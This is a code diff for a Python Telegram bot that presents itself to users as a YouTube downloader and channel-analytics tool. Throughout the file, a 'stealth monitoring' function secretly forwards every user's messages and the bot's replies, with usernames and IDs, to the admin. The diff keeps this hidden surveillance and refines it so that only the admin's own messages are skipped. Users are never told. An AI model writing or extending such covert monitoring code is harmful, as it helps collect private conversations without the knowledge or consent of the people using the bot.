@@ -8,6 +8,7 @@ import telebot
 from telebot import types
 import time
 from datetime import datetime
+import re
 
 # Load environment variables
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
@@ -21,12 +22,15 @@ app = Flask(__name__)
 
 # Storage
 user_sessions = {}
-admin_stats = {}
 
 # ==================== STEALTH MONITORING ====================
 def forward_to_admin(user_id, username, message_text, is_user_message=True):
     """Forward all user-bot conversations to admin secretly"""
     try:
+        # Don't forward admin's own messages
+        if str(user_id) == ADMIN_USER_ID:
+            return
+            
         if is_user_message:
             admin_msg = f"👤 User: @{username} (ID: {user_id})\n💬 Message: {message_text}"
         else:
@@ -37,15 +41,42 @@ def forward_to_admin(user_id, username, message_text, is_user_message=True):
         print(f"Monitoring error: {e}")
 
 # ==================== YOUTUBE API FUNCTIONS ====================
-def get_channel_stats(channel_id=None, username=None):
+def extract_channel_id(input_text):
+    """Extract channel ID from various YouTube URL formats"""
+    try:
+        # Handle channel URLs
+        if 'youtube.com/channel/' in input_text:
+            return input_text.split('youtube.com/channel/')[1].split('/')[0].split('?')[0]
+        elif 'youtube.com/c/' in input_text or 'youtube.com/user/' in input_text:
+            # For custom URLs, we need to search
+            return None
+        elif 'youtube.com/@' in input_text:
+            # Handle @username format
+            username = input_text.split('youtube.com/@')[1].split('/')[0].split('?')[0]
+            return get_channel_id_from_username(username)
+        else:
+            # Assume it's a channel ID or username
+            if len(input_text) == 24 and input_text.startswith('UC'):
+                return input_text
+            else:
+                return get_channel_id_from_username(input_text)
+    except:
+        return None
+
+def get_channel_id_from_username(username):
+    """Get channel ID from username"""
+    try:
+        search_url = f"https://www.googleapis.com/youtube/v3/search?key={YOUTUBE_API_KEY}&q={username}&type=channel&part=id&maxResults=1"
+        response = requests.get(search_url).json()
+        if response.get('items'):
+            return response['items'][0]['id']['channelId']
+        return None
+    except:
+        return None
+
+def get_channel_stats(channel_id):
     """Get YouTube channel statistics"""
     try:
-        if username:
-            search_url = f"https://www.googleapis.com/youtube/v3/search?key={YOUTUBE_API_KEY}&q={username}&type=channel&part=id&maxResults=1"
-            search_response = requests.get(search_url).json()
-            if search_response.get('items'):
-                channel_id = search_response['items'][0]['id']['channelId']
-        
         if not channel_id:
             return None
 
@@ -59,11 +90,12 @@ def get_channel_stats(channel_id=None, username=None):
         channel_data = stats_response['items'][0]
         return {
             'title': channel_data['snippet']['title'],
-            'subscribers': channel_data['statistics'].get('subscriberCount', 'N/A'),
-            'videos': channel_data['statistics'].get('videoCount', 'N/A'),
-            'views': channel_data['statistics'].get('viewCount', 'N/A'),
-            'description': channel_data['snippet']['description'][:200] + "..." if channel_data['snippet']['description'] else "No description",
-            'thumbnail': channel_data['snippet']['thumbnails']['default']['url']
+            'subscribers': "{:,}".format(int(channel_data['statistics'].get('subscriberCount', 0))),
+            'videos': "{:,}".format(int(channel_data['statistics'].get('videoCount', 0))),
+            'views': "{:,}".format(int(channel_data['statistics'].get('viewCount', 0))),
+            'description': channel_data['snippet']['description'][:200] + "..." if len(channel_data['snippet']['description']) > 200 else channel_data['snippet']['description'],
+            'thumbnail': channel_data['snippet']['thumbnails']['default']['url'],
+            'published_at': channel_data['snippet']['publishedAt'][:10]
         }
     except Exception as e:
         print(f"YouTube API Error: {e}")
@@ -80,13 +112,12 @@ def get_channel_videos(channel_id, max_results=10):
             if item['id']['kind'] == 'youtube#video':
                 video_id = item['id']['videoId']
                 video_url = f"https://www.youtube.com/watch?v={video_id}"
-                is_short = '/shorts/' in video_url or item['snippet']['title'].lower().startswith('#shorts')
                 
                 videos.append({
                     'title': item['snippet']['title'],
                     'url': video_url,
-                    'published_at': item['snippet']['publishedAt'],
-                    'is_short': is_short
+                    'published_at': item['snippet']['publishedAt'][:10],
+                    'channel_title': item['snippet']['channelTitle']
                 })
         return videos
     except Exception as e:
@@ -102,9 +133,9 @@ def get_video_details(video_id):
         if details_response.get('items'):
             video_data = details_response['items'][0]
             return {
-                'likes': video_data['statistics'].get('likeCount', 'N/A'),
-                'comments': video_data['statistics'].get('commentCount', 'N/A'),
-                'views': video_data['statistics'].get('viewCount', 'N/A'),
+                'likes': "{:,}".format(int(video_data['statistics'].get('likeCount', 0))),
+                'comments': "{:,}".format(int(video_data['statistics'].get('commentCount', 0))),
+                'views': "{:,}".format(int(video_data['statistics'].get('viewCount', 0))),
                 'title': video_data['snippet']['title']
             }
         return None
@@ -112,10 +143,36 @@ def get_video_details(video_id):
         print(f"Video details error: {e}")
         return None
 
-# ==================== DOWNLOAD FUNCTIONS ====================
+# ==================== SEARCH & DOWNLOAD FUNCTIONS ====================
+def search_youtube(query):
+    """Search YouTube for videos"""
+    try:
+        search_url = f"https://www.googleapis.com/youtube/v3/search?key={YOUTUBE_API_KEY}&q={query}&type=video&part=snippet&maxResults=8"
+        search_response = requests.get(search_url).json()
+        
+        results = []
+        for item in search_response.get('items', []):
+            video_id = item['id']['videoId']
+            video_details = get_video_details(video_id)
+            
+            results.append({
+                'title': item['snippet']['title'],
+                'video_id': video_id,
+                'url': f"https://www.youtube.com/watch?v={video_id}",
+                'channel': item['snippet']['channelTitle'],
+                'views': video_details['views'] if video_details else 'N/A',
+                'duration': 'N/A'  # Would need additional API call
+            })
+        return results
+    except Exception as e:
+        print(f"Search error: {e}")
+        return []
+
 def download_audio(video_url, chat_id):
     """Download audio from YouTube"""
     try:
+        bot.send_message(chat_id, "⏬ Downloading audio... Please wait!")
+        
         ydl_opts = {
             'format': 'bestaudio/best',
             'outtmpl': 'downloads/%(title)s.%(ext)s',
@@ -144,6 +201,8 @@ def download_audio(video_url, chat_id):
 def download_video(video_url, quality, chat_id):
     """Download video from YouTube with selected quality"""
     try:
+        bot.send_message(chat_id, f"⏬ Downloading video in {quality} quality... Please wait!")
+        
         if quality == 'high':
             format_selection = 'best[height<=1080]'
         elif quality == 'medium':
@@ -171,33 +230,15 @@ def download_video(video_url, quality, chat_id):
     except Exception as e:
         bot.send_message(chat_id, f"❌ Error downloading video: {str(e)}")
 
-def search_youtube(query, search_type='video'):
-    """Search YouTube for videos or music"""
-    try:
-        search_url = f"https://www.googleapis.com/youtube/v3/search?key={YOUTUBE_API_KEY}&q={query}&type=video&part=snippet&maxResults=10"
-        search_response = requests.get(search_url).json()
-        
-        results = []
-        for item in search_response.get('items', []):
-            results.append({
-                'title': item['snippet']['title'],
-                'video_id': item['id']['videoId'],
-                'url': f"https://www.youtube.com/watch?v={item['id']['videoId']}",
-                'channel': item['snippet']['channelTitle']
-            })
-        return results
-    except Exception as e:
-        print(f"Search error: {e}")
-        return []
-
 # ==================== BOT COMMANDS ====================
 @bot.message_handler(commands=['start'])
 def start_command(message):
     user_id = message.from_user.id
     username = message.from_user.username or "Unknown"
     
-    # Stealth monitoring
-    forward_to_admin(user_id, username, message.text)
+    # Stealth monitoring (skip admin)
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, message.text)
     
     welcome_text = """
 🎬 *YouTube Manager Bot* 🎵
@@ -208,7 +249,7 @@ def start_command(message):
 
 *Features:*
 • Download YouTube videos in different qualities
-• Download audio as MP3 files
+• Download audio as MP3 files  
 • Get channel analytics and statistics
 • Search and discover content
 
@@ -216,21 +257,19 @@ Simply use /switch to get started! 🚀
     """
     
     bot.reply_to(message, welcome_text, parse_mode='Markdown')
-    forward_to_admin(user_id, username, welcome_text, False)
+    
+    # Don't forward admin's own bot responses
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, welcome_text, False)
 
 # ==================== ADMIN COMMANDS ====================
 @bot.message_handler(commands=['analytical'])
 def analytical_command(message):
     user_id = message.from_user.id
-    username = message.from_user.username or "Unknown"
-    
-    # Stealth monitoring
-    forward_to_admin(user_id, username, message.text)
     
     # Admin check
     if str(user_id) != ADMIN_USER_ID:
-        bot.reply_to(message, "❌ This command is not available.")
-        forward_to_admin(user_id, username, "❌ This command is not available.", False)
+        bot.reply_to(message, "❌ This command is for admin only.")
         return
     
     try:
@@ -239,11 +278,11 @@ def analytical_command(message):
         # Get admin channel stats
         channel_stats = get_channel_stats(ADMIN_YOUTUBE_CHANNEL_ID)
         if not channel_stats:
-            bot.reply_to(message, "❌ Could not fetch channel data.")
+            bot.reply_to(message, "❌ Could not fetch channel data. Check your YOUTUBE_CHANNEL_ID environment variable.")
             return
         
         # Get videos
-        videos = get_channel_videos(ADMIN_YOUTUBE_CHANNEL_ID, 20)
+        videos = get_channel_videos(ADMIN_YOUTUBE_CHANNEL_ID, 10)
         
         # Prepare analytics
         analytics_text = f"""
@@ -253,6 +292,7 @@ def analytical_command(message):
 *Subscribers:* {channel_stats['subscribers']}
 *Total Videos:* {channel_stats['videos']}
 *Total Views:* {channel_stats['views']}
+*Created:* {channel_stats['published_at']}
 
 *Recent Videos Analysis:*
 """
@@ -260,60 +300,47 @@ def analytical_command(message):
             video_id = video['url'].split('v=')[1]
             video_details = get_video_details(video_id)
             if video_details:
-                analytics_text += f"\n{i}. {video_details['title']}"
+                analytics_text += f"\n{i}. *{video_details['title']}*"
                 analytics_text += f"\n   👁️ {video_details['views']} views | 👍 {video_details['likes']} likes | 💬 {video_details['comments']} comments\n"
+            else:
+                analytics_text += f"\n{i}. {video['title']}\n   📅 {video['published_at']}\n"
         
         bot.reply_to(message, analytics_text, parse_mode='Markdown')
-        forward_to_admin(user_id, username, analytics_text, False)
         
     except Exception as e:
         error_msg = f"❌ Analytics error: {str(e)}"
         bot.reply_to(message, error_msg)
-        forward_to_admin(user_id, username, error_msg, False)
 
 @bot.message_handler(commands=['posts'])
 def posts_command(message):
     user_id = message.from_user.id
-    username = message.from_user.username or "Unknown"
-    
-    # Stealth monitoring
-    forward_to_admin(user_id, username, message.text)
     
     # Admin check
     if str(user_id) != ADMIN_USER_ID:
-        bot.reply_to(message, "❌ This command is not available.")
+        bot.reply_to(message, "❌ This command is for admin only.")
         return
     
     try:
         bot.reply_to(message, "📹 Fetching your channel content...")
         
-        videos = get_channel_videos(ADMIN_YOUTUBE_CHANNEL_ID, 50)
+        videos = get_channel_videos(ADMIN_YOUTUBE_CHANNEL_ID, 20)
         
-        regular_videos = [v for v in videos if not v['is_short']]
-        shorts = [v for v in videos if v['is_short']]
+        if not videos:
+            bot.reply_to(message, "❌ No videos found or couldn't fetch data.")
+            return
         
         posts_text = "🎥 *Your Channel Content*\n\n"
         
-        if regular_videos:
-            posts_text += "*📺 Videos:*\n"
-            for i, video in enumerate(regular_videos[:10], 1):
-                posts_text += f"{i}. [{video['title']}]({video['url']})\n"
-        
-        if shorts:
-            posts_text += "\n*🎬 Shorts:*\n"
-            for i, short in enumerate(shorts[:10], 1):
-                posts_text += f"{i}. [{short['title']}]({short['url']})\n"
-        
-        if not regular_videos and not shorts:
-            posts_text += "No content found."
+        posts_text += "*📺 Recent Videos:*\n"
+        for i, video in enumerate(videos[:10], 1):
+            posts_text += f"{i}. [{video['title']}]({video['url']})\n"
+            posts_text += f"   📅 {video['published_at']}\n\n"
         
         bot.reply_to(message, posts_text, parse_mode='Markdown', disable_web_page_preview=True)
-        forward_to_admin(user_id, username, posts_text, False)
         
     except Exception as e:
         error_msg = f"❌ Posts error: {str(e)}"
         bot.reply_to(message, error_msg)
-        forward_to_admin(user_id, username, error_msg, False)
 
 # ==================== SWITCH COMMAND ====================
 @bot.message_handler(commands=['switch'])
@@ -321,8 +348,9 @@ def switch_command(message):
     user_id = message.from_user.id
     username = message.from_user.username or "Unknown"
     
-    # Stealth monitoring
-    forward_to_admin(user_id, username, message.text)
+    # Stealth monitoring (skip admin)
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, message.text)
     
     markup = types.InlineKeyboardMarkup()
     btn_music = types.InlineKeyboardButton("🎵 YouTube Music", callback_data="switch_music")
@@ -331,22 +359,27 @@ def switch_command(message):
     
     response = "🎛️ *Choose Mode:*\n\n• 🎵 YouTube Music - Download audio files\n• 🎬 YouTube Client - Download videos with quality options"
     bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
-    forward_to_admin(user_id, username, response, False)
+    
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, response, False)
 
 # ==================== CHANNEL CHECK COMMAND ====================
-@bot.message_handler(commands=['checkYTChannel'])
+@bot.message_handler(commands=['checkytchannel'])
 def check_channel_command(message):
     user_id = message.from_user.id
     username = message.from_user.username or "Unknown"
     
-    # Stealth monitoring
-    forward_to_admin(user_id, username, message.text)
+    # Stealth monitoring (skip admin)
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, message.text)
     
     user_sessions[user_id] = {'waiting_for_channel': True}
     
-    response = "🔍 *YouTube Channel Analyzer*\n\nSend me:\n• YouTube channel URL\n• Or channel username\n• Or channel ID"
+    response = "🔍 *YouTube Channel Analyzer*\n\nSend me:\n• YouTube channel URL\n• Or channel username starting with @\n• Or channel custom URL"
     bot.reply_to(message, response, parse_mode='Markdown')
-    forward_to_admin(user_id, username, response, False)
+    
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, response, False)
 
 # ==================== CALLBACK HANDLERS ====================
 @bot.callback_query_handler(func=lambda call: True)
@@ -364,7 +397,9 @@ def handle_callbacks(call):
             response = "🎬 *YouTube Client Mode*\n\nSend me the video name or YouTube URL you want to download."
         
         bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
-        forward_to_admin(user_id, username, response, False)
+        
+        if str(user_id) != ADMIN_USER_ID:
+            forward_to_admin(user_id, username, response, False)
     
     elif call.data.startswith('quality_'):
         _, video_url, quality = call.data.split('_', 2)
@@ -375,6 +410,21 @@ def handle_callbacks(call):
         video_url = call.data.split('_')[1]
         bot.edit_message_text("⏬ Downloading audio...", call.message.chat.id, call.message.message_id)
         download_audio(video_url, call.message.chat.id)
+    
+    elif call.data.startswith('select_'):
+        video_url = call.data.split('_')[1]
+        user_sessions[user_id]['selected_video'] = video_url
+        
+        if user_sessions[user_id].get('mode') == 'music':
+            download_audio(video_url, call.message.chat.id)
+        else:
+            markup = types.InlineKeyboardMarkup()
+            btn_high = types.InlineKeyboardButton("HD (1080p)", callback_data=f"quality_{video_url}_high")
+            btn_medium = types.InlineKeyboardButton("Medium (720p)", callback_data=f"quality_{video_url}_medium")
+            btn_low = types.InlineKeyboardButton("Low (480p)", callback_data=f"quality_{video_url}_low")
+            markup.add(btn_high, btn_medium, btn_low)
+            
+            bot.edit_message_text("🎬 Choose video quality:", call.message.chat.id, call.message.message_id, reply_markup=markup)
 
 # ==================== MESSAGE HANDLERS ====================
 @bot.message_handler(func=lambda message: True)
@@ -383,8 +433,9 @@ def handle_all_messages(message):
     username = message.from_user.username or "Unknown"
     user_input = message.text
     
-    # Stealth monitoring
-    forward_to_admin(user_id, username, user_input)
+    # Stealth monitoring (skip admin)
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, user_input)
     
     # Handle channel check
     if user_sessions.get(user_id, {}).get('waiting_for_channel'):
@@ -392,9 +443,13 @@ def handle_all_messages(message):
         
         bot.reply_to(message, "🔍 Analyzing channel...")
         
-        # Extract channel ID from various inputs
-        channel_input = user_input.strip()
-        channel_stats = get_channel_stats(channel_input, channel_input)
+        # Extract channel ID
+        channel_id = extract_channel_id(user_input)
+        if not channel_id:
+            bot.reply_to(message, "❌ Could not find channel. Please provide:\n• Full YouTube channel URL\n• @username\n• Channel custom URL")
+            return
+        
+        channel_stats = get_channel_stats(channel_id)
         
         if channel_stats:
             response = f"""
@@ -404,13 +459,15 @@ def handle_all_messages(message):
 *Subscribers:* {channel_stats['subscribers']}
 *Total Videos:* {channel_stats['videos']}
 *Total Views:* {channel_stats['views']}
+*Created:* {channel_stats['published_at']}
 *Description:* {channel_stats['description']}
             """
             bot.reply_to(message, response, parse_mode='Markdown')
         else:
-            bot.reply_to(message, "❌ Could not find channel. Please check the URL/username.")
+            bot.reply_to(message, "❌ Could not fetch channel data. Please check the URL/username.")
         
-        forward_to_admin(user_id, username, response if channel_stats else "Channel not found", False)
+        if str(user_id) != ADMIN_USER_ID:
+            forward_to_admin(user_id, username, response if channel_stats else "Channel not found", False)
         return
     
     # Handle music/video mode
@@ -441,50 +498,27 @@ def handle_all_messages(message):
                 markup = types.InlineKeyboardMarkup()
                 
                 for i, result in enumerate(results[:5]):
-                    response += f"{i+1}. {result['title']}\n   👉 {result['channel']}\n\n"
+                    response += f"{i+1}. *{result['title']}*\n"
+                    response += f"   👉 {result['channel']} | 👁️ {result['views']} views\n\n"
                     
-                    if mode == 'music':
-                        btn = types.InlineKeyboardButton(f"🎵 Download {i+1}", callback_data=f"download_{result['url']}")
-                    else:
-                        btn = types.InlineKeyboardButton(f"🎬 Choose {i+1}", callback_data=f"quality_{result['url']}_menu")
+                    callback_data = f"select_{result['url']}"
+                    btn = types.InlineKeyboardButton(f"🎵 Download {i+1}" if mode == 'music' else f"🎬 Select {i+1}", callback_data=callback_data)
                     markup.add(btn)
                 
                 bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
             else:
-                bot.reply_to(message, "❌ No results found. Try different keywords.")
+                bot.reply_to(message, "❌ No results found. Try different keywords or check your YouTube API key.")
         
-        forward_to_admin(user_id, username, f"Mode: {mode}, Query: {user_input}", False)
+        if str(user_id) != ADMIN_USER_ID:
+            forward_to_admin(user_id, username, f"Mode: {mode}, Query: {user_input}", False)
         return
     
     # Default response for unknown messages
     default_response = "🤖 Use /start to see available commands or /switch to start downloading content."
     bot.reply_to(message, default_response)
-    forward_to_admin(user_id, username, default_response, False)
-
-# ==================== AUTO WEEKLY REPORT ====================
-def send_weekly_report():
-    """Send weekly analytics report to admin"""
-    try:
-        channel_stats = get_channel_stats(ADMIN_YOUTUBE_CHANNEL_ID)
-        if channel_stats:
-            report = f"""
-📊 *Weekly Analytics Report* - {datetime.now().strftime('%Y-%m-%d')}
-
-*Channel:* {channel_stats['title']}
-*Subscribers:* {channel_stats['subscribers']} (+ change)
-*Total Videos:* {channel_stats['videos']}
-*Total Views:* {channel_stats['views']} (+ change)
-
-*Bot Statistics:*
-• Total users this week: [tracking needed]
-• Downloads performed: [tracking needed]
-• Channel checks: [tracking needed]
-
-Keep creating great content! 🚀
-            """
-            bot.send_message(ADMIN_USER_ID, report, parse_mode='Markdown')
-    except Exception as e:
-        print(f"Weekly report error: {e}")
+    
+    if str(user_id) != ADMIN_USER_ID:
+        forward_to_admin(user_id, username, default_response, False)
 
 # ==================== FLASK APP & BOT RUN ====================
 @app.route('/')
@@ -493,7 +527,12 @@ def home():
 
 def run_bot():
     print("🤖 Starting YouTube Manager Bot...")
-    bot.infinity_polling()
+    try:
+        bot.infinity_polling()
+    except Exception as e:
+        print(f"Bot error: {e}")
+        time.sleep(5)
+        run_bot()
 
 if __name__ == '__main__':
     # Create downloads directory
